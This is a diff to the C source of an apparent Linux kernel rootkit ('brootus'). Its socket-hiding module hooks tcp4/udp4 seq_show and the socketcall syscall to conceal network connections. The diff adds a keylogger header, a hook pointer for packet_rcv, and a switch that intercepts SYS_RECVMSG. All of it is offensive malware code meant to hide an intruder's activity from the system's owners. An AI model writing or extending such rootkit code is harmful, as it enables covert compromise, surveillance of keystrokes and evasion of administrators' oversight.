@@ -15,6 +15,7 @@
 
 #include "kernel_functions.h"
 #include "syscall.h"
+#include "keylogger.h"
 #include "socket_hiding.h"
 
 #define SOCKET_STATE_VISIBLE 0
@@ -28,6 +29,8 @@ int socket_hiding_state = SOCKET_STATE_VISIBLE;
  int (*original_tcp4_seq_show)(struct seq_file*, void*);
  int (*original_udp4_seq_show)(struct seq_file*, void*);
  asmlinkage long (*original_socketcall)(int, unsigned long*);
+ int (*original_packet_rcv)(struct sk_buff*, struct net_device*,
+                            struct packet_type*, struct net_device*);
 
  void** tcp_hook_fn_ptr;
  void** udp_hook_fn_ptr;
@@ -258,10 +261,12 @@ asmlinkage long brootus_recvmsg(int fd, struct msghdr __user *umsg, unsigned fla
 
 asmlinkage long brootus_socketcall(int call, unsigned long __user *args)
 {
-  if (call == SYS_RECVMSG) {
-    return brootus_recvmsg(args[0], (struct msghdr __user *)args[1], args[2]);
+  switch (call) {
+    case SYS_RECVMSG:
+      return brootus_recvmsg(args[0], (struct msghdr __user *)args[1], args[2]);
+    default:
+      return original_socketcall(call, args);
   }
-  return original_socketcall(call, args);
 }
 
 void enable_socket_hiding(void)
@@ -315,6 +320,7 @@ void disable_socket_hiding(void)
 
   socket_hiding_state = SOCKET_STATE_VISIBLE;
 }
+
 
 void init_socket_hiding(void)
 {
